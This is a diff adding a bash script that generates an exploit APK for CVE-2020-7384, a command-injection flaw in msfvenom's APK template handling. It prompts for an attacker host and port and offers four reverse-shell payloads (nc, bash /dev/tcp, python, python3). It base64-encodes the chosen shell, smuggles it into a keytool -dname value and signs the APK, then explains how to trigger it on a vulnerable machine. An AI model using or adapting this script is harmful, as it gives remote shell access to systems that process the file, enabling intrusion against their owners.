@@ -1,0 +1,47 @@
+echo -e "\n\x1B[31mCVE-2020-7384\e[0m"
+
+echo -e "\nEnter the LHOST: "
+read lhost
+echo -e "\nEnter the LPORT: "
+read lport
+
+echo -e "\nSelect the payload type\n1. nc\n2. bash\n3. python\n4. python3\n"
+
+read -p "select: " -e select
+case $select in  
+  1|nc) pyld="mkfifo /tmp/nbnvdoi; nc $lhost $lport 0</tmp/nbnvdoi | /bin/sh >/tmp/nbnvdoi 2>&1; rm /tmp/nbnvdoi" ;; 
+  2|bash) pyld="/bin/bash -c \"/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1\"" ;;
+  3|python) pyld="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;; 
+  4|python3) pyld="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;; 
+esac
+
+
+payload=$pyld
+payload_b64=$(echo $payload | base64 -w 0)
+dname="CN='|echo $payload_b64 | base64 -d | sh #"
+
+echo -e "\nEnter the Directory (absolute path) where you would like to save the apk file (Hit Enter to use the current directory): "
+read directory
+
+if [ -z "$directory" ]
+then
+      directory=$(pwd)
+fi
+
+cd $directory
+
+rm signing.keystore 2> /dev/null
+rm emptyfile 2> /dev/null
+rm exploit.apk 2> /dev/null
+
+# Touch empty_file
+touch emptyfile
+
+# Create apk_file
+zip -j exploit.apk emptyfile
+
+# Generate signing key with malicious -dname"
+keytool -genkey -keystore signing.keystore -alias signing.key -storepass password -keypass password -keyalg RSA -keysize 2048 -dname "$dname"
+
+# Sign APK using our malicious dname
+jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore signing.keystore -storepass password -keypass password exploit.apk signing.key && echo -e "\nNew APK file Generated\nLocation: \"$(pwd)/exploit.apk\"\n\nThe APK file generated could be now uploaded or used for exploitation\n\nIf you have access to the vulnerable machine then run:\nmsfvenom -x <your newly created apk> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\n" || echo -n "\nSomething Went Wrong !!!\n"
